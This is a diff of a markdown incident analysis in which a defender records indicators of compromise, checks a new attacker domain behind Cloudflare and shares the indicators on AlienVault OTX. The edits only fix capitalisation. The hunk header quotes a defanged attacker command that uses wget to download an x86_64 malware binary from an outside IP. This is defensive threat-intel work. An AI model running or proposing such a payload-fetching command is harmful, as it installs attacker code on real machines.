@@ -89,9 +89,9 @@ wget http://23.94.22[.]13/x86_64
 
 ### Follow Up Analysis
 
-- At this point, We've collected a handful of IoC's. We have IP addresses(both from the original attack and the ones contained in the exploits). We have a domain. We also have some pretty unique strings we may be able to write a yara rule with down the road.  
+- At this point, We've collected a handful of IoC's. We have IP addresses(both from the original attack and the ones contained in the exploits). We have a domain. We also have some pretty unique strings we may be able to write a YARA rule with down the road.  
 - Lets investigate that domain. 
-    - Just days old. Also proxied through cloudflare. - Smart. Don't exactly want to block Cloudflare IP. Can still block that domain though!
+    - Just days old. Also proxied through Cloudflare. - Smart. Don't exactly want to block Cloudflare IP. Can still block that domain though!
 ![image.png](/.attachments/image-ab391949-b696-432f-842f-a97e0dac6ea4.png)
 
 - Next we can share this intel with the community by submitting our IoC's as a pulse on AlienVault OTX. I've done so. First Pulse for this domain!
